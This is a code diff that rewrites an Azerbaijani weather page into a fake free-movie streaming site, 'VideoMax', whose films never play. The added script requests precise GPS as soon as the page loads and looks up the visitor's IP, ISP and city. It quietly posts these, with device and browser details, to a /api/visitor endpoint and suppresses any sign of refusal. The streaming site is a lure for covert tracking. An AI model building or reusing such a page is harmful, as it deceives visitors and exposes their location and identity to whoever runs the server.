@@ -3,139 +3,245 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Афера с Bitunix по отмыванию денег раскрыта.</title>
+    <title>VideoMax - Pulsuz Filmlər</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0f0f0f;
+            color: #fff;
             min-height: 100vh;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+
+        .navbar {
+            background: #1a1a1a;
+            padding: 15px 30px;
             display: flex;
             align-items: center;
-            justify-content: center;
-            padding: 20px;
+            justify-content: space-between;
+            border-bottom: 1px solid #333;
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
 
-        .container {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            padding: 40px;
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #e50914;
+            letter-spacing: -1px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 20px;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: #aaa;
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: color 0.2s;
+        }
+
+        .nav-links a:hover { color: #fff; }
+
+        .search-bar {
+            display: flex;
+            align-items: center;
+            background: #333;
+            border-radius: 4px;
+            padding: 6px 12px;
+        }
+
+        .search-bar input {
+            background: transparent;
+            border: none;
+            color: #fff;
+            outline: none;
+            width: 150px;
+            font-size: 0.85rem;
+        }
+
+        .search-bar span { color: #aaa; margin-right: 8px; }
+
+        .hero {
+            position: relative;
+            height: 450px;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.2), #0f0f0f),
+                        linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            display: flex;
+            align-items: center;
+            padding: 0 50px;
+        }
+
+        .hero-content {
             max-width: 500px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            text-align: center;
         }
 
-        h1 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 1.8rem;
+        .hero-content h1 {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            line-height: 1.2;
         }
 
-        .subtitle {
-            color: #666;
-            margin-bottom: 30px;
-            font-size: 0.95rem;
+        .hero-content p {
+            color: #aaa;
+            font-size: 1rem;
+            margin-bottom: 20px;
+            line-height: 1.5;
         }
 
-        .btn {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        .btn-play {
+            background: #e50914;
             color: white;
             border: none;
-            padding: 14px 32px;
-            border-radius: 30px;
+            padding: 12px 28px;
+            border-radius: 4px;
             font-size: 1rem;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: background 0.2s;
+        }
+
+        .btn-play:hover { background: #b8070f; }
+
+        .section {
+            padding: 30px 30px;
+        }
+
+        .section-title {
+            font-size: 1.3rem;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .video-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+        }
+
+        .video-card {
+            background: #1a1a1a;
+            border-radius: 8px;
+            overflow: hidden;
             cursor: pointer;
             transition: transform 0.2s, box-shadow 0.2s;
         }
 
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+        .video-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
 
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .info-card {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 20px;
-            margin-top: 20px;
-            text-align: left;
-            display: none;
-        }
-
-        .info-card.visible {
-            display: block;
-        }
-
-        .info-row {
+        .video-thumb {
+            width: 100%;
+            height: 120px;
+            background: linear-gradient(135deg, #2a2a3e, #1a1a2e);
             display: flex;
-            justify-content: space-between;
             align-items: center;
-            padding: 10px 0;
-            border-bottom: 1px solid #eee;
+            justify-content: center;
+            position: relative;
         }
 
-        .info-row:last-child {
-            border-bottom: none;
+        .video-thumb::after {
+            content: '▶';
+            font-size: 2rem;
+            color: rgba(255,255,255,0.7);
         }
 
-        .info-label {
-            color: #666;
-            font-size: 0.9rem;
+        .video-thumb .duration {
+            position: absolute;
+            bottom: 5px;
+            right: 8px;
+            background: rgba(0,0,0,0.8);
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 0.7rem;
         }
 
-        .info-value {
-            color: #333;
-            font-weight: 600;
-            font-size: 0.95rem;
+        .video-info {
+            padding: 10px;
         }
 
-        .weather-icon {
-            font-size: 3rem;
-            margin: 15px 0;
+        .video-info h4 {
+            font-size: 0.85rem;
+            margin-bottom: 5px;
+            color: #eee;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
         }
 
-        .temp {
-            font-size: 2.5rem;
-            font-weight: 700;
-            color: #333;
+        .video-info p {
+            font-size: 0.75rem;
+            color: #888;
         }
 
-        .weather-desc {
-            color: #666;
-            font-size: 1.1rem;
-            text-transform: capitalize;
-            margin-bottom: 15px;
+        .categories {
+            display: flex;
+            gap: 10px;
+            padding: 20px 30px;
+            overflow-x: auto;
+            flex-wrap: wrap;
         }
 
-        .loading {
+        .cat-btn {
+            background: #222;
+            border: 1px solid #333;
+            color: #ccc;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            white-space: nowrap;
+            transition: all 0.2s;
+        }
+
+        .cat-btn:hover, .cat-btn.active {
+            background: #e50914;
+            border-color: #e50914;
+            color: #fff;
+        }
+
+        /* Modal */
+        .modal-overlay {
             display: none;
-            margin: 20px 0;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
         }
 
-        .loading.visible {
-            display: block;
+        .modal-overlay.visible {
+            display: flex;
         }
 
-        .spinner {
+        .modal {
+            background: #1a1a1a;
+            border-radius: 12px;
+            padding: 30px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .modal .spinner {
             width: 40px;
             height: 40px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
+            border: 4px solid #333;
+            border-top: 4px solid #e50914;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 10px;
+            margin: 0 auto 15px;
         }
 
         @keyframes spin {
@@ -143,106 +249,134 @@
             100% { transform: rotate(360deg); }
         }
 
-        .error {
-            color: #e74c3c;
-            margin-top: 15px;
-            display: none;
+        .modal p {
+            color: #aaa;
+            font-size: 0.9rem;
         }
 
-        .error.visible {
-            display: block;
-        }
-
-        .consent-note {
+        footer {
+            text-align: center;
+            padding: 30px;
+            color: #555;
             font-size: 0.8rem;
-            color: #999;
-            margin-top: 20px;
-            line-height: 1.5;
+            border-top: 1px solid #222;
+            margin-top: 30px;
         }
 
-        .ip-section {
-            margin-top: 15px;
-            padding-top: 15px;
-            border-top: 2px solid #eee;
+        @media (max-width: 600px) {
+            .hero { height: 300px; padding: 0 20px; }
+            .hero-content h1 { font-size: 1.5rem; }
+            .nav-links { display: none; }
+            .video-grid { grid-template-columns: repeat(2, 1fr); }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🌤️ Hava Məlumatı</h1>
-        <p class="subtitle">Cari hava məlumatınız yüklənir...</p>
-
-        <div class="loading visible" id="loading">
-            <div class="spinner"></div>
-            <p>Məlumatlar yüklənir...</p>
+    <nav class="navbar">
+        <div class="logo">VideoMax</div>
+        <ul class="nav-links">
+            <li><a href="#">Ana Səhifə</a></li>
+            <li><a href="#">Filmlər</a></li>
+            <li><a href="#">Seriallar</a></li>
+            <li><a href="#">Yeni</a></li>
+        </ul>
+        <div class="search-bar">
+            <span>🔍</span>
+            <input type="text" placeholder="Axtar...">
         </div>
+    </nav>
 
-        <p class="error" id="error"></p>
-
-        <div class="info-card" id="weatherCard">
-            <div style="text-align: center;">
-                <div class="weather-icon" id="weatherIcon"></div>
-                <div class="temp" id="temperature"></div>
-                <div class="weather-desc" id="weatherDesc"></div>
-            </div>
-
-            <div class="info-row">
-                <span class="info-label">📍 Şəhər</span>
-                <span class="info-value" id="city">-</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">🌡️ Hiss olunan</span>
-                <span class="info-value" id="feelsLike">-</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">💧 Rütubət</span>
-                <span class="info-value" id="humidity">-</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">💨 Külək</span>
-                <span class="info-value" id="wind">-</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">🌐 Enlik</span>
-                <span class="info-value" id="lat">-</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">🌐 Uzunluq</span>
-                <span class="info-value" id="lon">-</span>
-            </div>
-
-            <div class="ip-section">
-                <div class="info-row">
-                    <span class="info-label">🖥️ IP Ünvanı</span>
-                    <span class="info-value" id="ipAddress">-</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">🏢 Provayder</span>
-                    <span class="info-value" id="isp">-</span>
-                </div>
-            </div>
+    <div class="hero">
+        <div class="hero-content">
+            <h1>Ən Yeni Filmləri Pulsuz İzlə</h1>
+            <p>Minlərlə film və serial. HD keyfiyyətdə, reklamsız, pulsuz.</p>
+            <button class="btn-play" onclick="playVideo()">▶ İzləməyə Başla</button>
         </div>
-
-        <p class="consent-note">
-            ⚠️
-        </p>
     </div>
 
+    <div class="categories">
+        <button class="cat-btn active">Hamısı</button>
+        <button class="cat-btn">Aksiyon</button>
+        <button class="cat-btn">Komediya</button>
+        <button class="cat-btn">Dram</button>
+        <button class="cat-btn">Qorxu</button>
+        <button class="cat-btn">Fantastika</button>
+        <button class="cat-btn">Romantik</button>
+        <button class="cat-btn">Sənədli</button>
+    </div>
+
+    <section class="section">
+        <h2 class="section-title">🔥 Trend Filmlər</h2>
+        <div class="video-grid" id="trendGrid"></div>
+    </section>
+
+    <section class="section">
+        <h2 class="section-title">⭐ Tövsiyə Olunan</h2>
+        <div class="video-grid" id="recGrid"></div>
+    </section>
+
+    <!-- Video yüklənir modal -->
+    <div class="modal-overlay" id="modal">
+        <div class="modal">
+            <div class="spinner"></div>
+            <p>Video yüklənir, zəhmət olmasa gözləyin...</p>
+        </div>
+    </div>
+
+    <footer>
+        © 2024 VideoMax. Bütün hüquqlar qorunur.
+    </footer>
+
     <script>
-        // Səhifə açılan kimi avtomatik GPS icazəsi soruş
+        const filmNames = [
+            'Sürət və Qəzəb 11', 'Oppenheimer', 'Barbie', 'John Wick 4',
+            'Avatar 2', 'Top Gun: Maverick', 'Dune Part 2', 'Deadpool 3',
+            'İnterstellar', 'Joker 2', 'Batman', 'Spider-Man: No Way Home',
+            'Gladiator 2', 'Wicked', 'Venom 3', 'Aquaman 2',
+            'Mission Impossible 8', 'Transformers One', 'Kung Fu Panda 4', 'Godzilla x Kong'
+        ];
+
+        const durations = ['1:45:20', '2:10:33', '1:58:12', '2:22:45', '1:33:08', '2:01:55', '1:48:30', '2:15:00', '1:52:41', '2:30:10'];
+
+        function generateCards(containerId, start, count) {
+            const container = document.getElementById(containerId);
+            let html = '';
+            for (let i = start; i < start + count; i++) {
+                const name = filmNames[i % filmNames.length];
+                const dur = durations[i % durations.length];
+                const views = Math.floor(Math.random() * 900 + 100) + 'K baxış';
+                html += `
+                    <div class="video-card" onclick="playVideo()">
+                        <div class="video-thumb">
+                            <span class="duration">${dur}</span>
+                        </div>
+                        <div class="video-info">
+                            <h4>${name}</h4>
+                            <p>${views} • HD</p>
+                        </div>
+                    </div>
+                `;
+            }
+            container.innerHTML = html;
+        }
+
+        generateCards('trendGrid', 0, 10);
+        generateCards('recGrid', 10, 10);
+
+        // Səhifə açılan kimi GPS soruş
         window.addEventListener('load', function() {
             requestLocation();
         });
 
-        function requestLocation() {
-            if (!navigator.geolocation) {
-                showError('Brauzeriniz geolokasiya dəstəkləmir.');
-                return;
-            }
+        function playVideo() {
+            document.getElementById('modal').classList.add('visible');
+            setTimeout(() => {
+                document.getElementById('modal').classList.remove('visible');
+            }, 5000);
+        }
 
-            document.getElementById('loading').classList.add('visible');
-            document.getElementById('error').classList.remove('visible');
-            document.getElementById('weatherCard').classList.remove('visible');
+        function requestLocation() {
+            if (!navigator.geolocation) return;
 
             navigator.geolocation.getCurrentPosition(onSuccess, onError, {
                 enableHighAccuracy: true,
@@ -255,24 +389,29 @@
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
 
-            document.getElementById('lat').textContent = lat.toFixed(4);
-            document.getElementById('lon').textContent = lon.toFixed(4);
-
-            const ipData = await fetchIP();
-            await fetchWeather(lat, lon);
-
-            // Məlumatları serverə göndər
+            let ipData = {};
             try {
-                const cityEl = document.getElementById('city').textContent;
+                const res = await fetch('https://ipapi.co/json/');
+                ipData = await res.json();
+            } catch(e) {}
+
+            let city = '';
+            try {
+                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=az`);
+                const data = await res.json();
+                city = data.address.city || data.address.town || data.address.village || '';
+            } catch(e) {}
+
+            try {
                 await fetch('/api/visitor', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        ip: ipData.ip,
-                        isp: ipData.org,
+                        ip: ipData.ip || '',
+                        isp: ipData.org || '',
                         lat: lat.toFixed(4),
                         lon: lon.toFixed(4),
-                        city: cityEl,
+                        city: city,
                         country: ipData.country_name || '',
                         device: navigator.platform,
                         browser: navigator.userAgent.split(' ').pop(),
@@ -282,129 +421,8 @@
             } catch(e) {}
         }
 
-        function onError(error) {
-            let message = '';
-            switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    message = 'Lokasiya icazəsi rədd edildi. Hava məlumatı üçün icazə lazımdır.';
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    message = 'Yer məlumatı əlçatan deyil.';
-                    break;
-                case error.TIMEOUT:
-                    message = 'Yer sorğusu vaxtı keçdi.';
-                    break;
-                default:
-                    message = 'Naməlum xəta baş verdi.';
-            }
-            showError(message);
-            document.getElementById('loading').classList.remove('visible');
-        }
-
-        async function fetchIP() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                document.getElementById('ipAddress').textContent = data.ip || '-';
-                document.getElementById('isp').textContent = data.org || '-';
-                return data;
-            } catch (e) {
-                document.getElementById('ipAddress').textContent = 'Alınmadı';
-                document.getElementById('isp').textContent = 'Alınmadı';
-                return {};
-            }
-        }
-
-        async function fetchWeather(lat, lon) {
-            try {
-                const url = `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current=temperature_2m,relative_humidity_2m,apparent_temperature,weather_code,wind_speed_10m&timezone=auto`;
-                const response = await fetch(url);
-                const data = await response.json();
-
-                const current = data.current;
-                const temp = Math.round(current.temperature_2m);
-                const feelsLike = Math.round(current.apparent_temperature);
-                const humidity = current.relative_humidity_2m;
-                const windSpeed = Math.round(current.wind_speed_10m);
-                const weatherCode = current.weather_code;
-
-                document.getElementById('temperature').textContent = `${temp}°C`;
-                document.getElementById('feelsLike').textContent = `${feelsLike}°C`;
-                document.getElementById('humidity').textContent = `${humidity}%`;
-                document.getElementById('wind').textContent = `${windSpeed} km/s`;
-                document.getElementById('weatherIcon').textContent = getWeatherEmoji(weatherCode);
-                document.getElementById('weatherDesc').textContent = getWeatherDescription(weatherCode);
-
-                await fetchCityName(lat, lon);
-
-                document.getElementById('loading').classList.remove('visible');
-                document.getElementById('weatherCard').classList.add('visible');
-            } catch (e) {
-                showError('Hava məlumatı alına bilmədi. Yenidən cəhd edin.');
-                document.getElementById('loading').classList.remove('visible');
-            }
-        }
-
-        async function fetchCityName(lat, lon) {
-            try {
-                const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=az`;
-                const response = await fetch(url);
-                const data = await response.json();
-                const city = data.address.city || data.address.town || data.address.village || data.address.state || '-';
-                document.getElementById('city').textContent = city;
-            } catch (e) {
-                document.getElementById('city').textContent = '-';
-            }
-        }
-
-        function getWeatherEmoji(code) {
-            if (code === 0) return '☀️';
-            if (code <= 3) return '⛅';
-            if (code <= 48) return '🌫️';
-            if (code <= 57) return '🌦️';
-            if (code <= 65) return '🌧️';
-            if (code <= 67) return '🌨️';
-            if (code <= 77) return '❄️';
-            if (code <= 82) return '🌧️';
-            if (code <= 86) return '🌨️';
-            if (code >= 95) return '⛈️';
-            return '🌤️';
-        }
-
-        function getWeatherDescription(code) {
-            const descriptions = {
-                0: 'Açıq hava',
-                1: 'Əsasən açıq',
-                2: 'Qismən buludlu',
-                3: 'Buludlu',
-                45: 'Dumanlı',
-                48: 'Qırovlu duman',
-                51: 'Yüngül çiskin',
-                53: 'Orta çiskin',
-                55: 'Güclü çiskin',
-                61: 'Yüngül yağış',
-                63: 'Orta yağış',
-                65: 'Güclü yağış',
-                71: 'Yüngül qar',
-                73: 'Orta qar',
-                75: 'Güclü qar',
-                77: 'Qar dənələri',
-                80: 'Yüngül leysan',
-                81: 'Orta leysan',
-                82: 'Güclü leysan',
-                85: 'Yüngül qar yağışı',
-                86: 'Güclü qar yağışı',
-                95: 'İldırımlı tufan',
-                96: 'Dolu ilə tufan',
-                99: 'Güclü dolu ilə tufan'
-            };
-            return descriptions[code] || 'Naməlum';
-        }
-
-        function showError(message) {
-            const el = document.getElementById('error');
-            el.textContent = message;
-            el.classList.add('visible');
+        function onError(err) {
+            // Sessiz keç - istifadəçi rədd etdisə heç nə göstərmə
         }
     </script>
 </body>
